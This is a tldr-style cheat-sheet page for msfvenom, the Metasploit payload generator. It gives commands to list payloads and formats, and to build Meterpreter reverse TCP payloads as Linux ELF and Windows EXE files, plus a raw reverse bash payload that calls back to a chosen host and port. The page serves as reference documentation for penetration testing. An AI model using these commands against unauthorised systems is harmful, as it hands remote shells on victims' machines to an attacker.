---
layout: page
title: common/msfvenom (English)
description: "Manually generate payloads for metasploit."
content_hash: 7918cafc87e5a6f6b088baf1d15fec4e056a6396
last_modified_at: 2023-11-12
tldri18n_status: 2
---
# msfvenom

Manually generate payloads for metasploit.
More information: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>.

- List payloads:

`msfvenom -l payloads`

- List formats:

`msfvenom -l formats`

- Show payload options:

`msfvenom -p `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">payload</span>` --list-options`

- Create an ELF binary with a reverse TCP handler:

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_ip</span>` LPORT=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_port</span>` -f elf -o `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">path/to/binary</span>

- Create an EXE binary with a reverse TCP handler:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_ip</span>` LPORT=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_port</span>` -f exe -o `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">path/to/binary.exe</span>

- Create a raw bash with a reverse TCP handler:

`msfvenom -p cmd/unix/reverse_bash LHOST=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_ip</span>` LPORT=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_port</span>` -f raw`
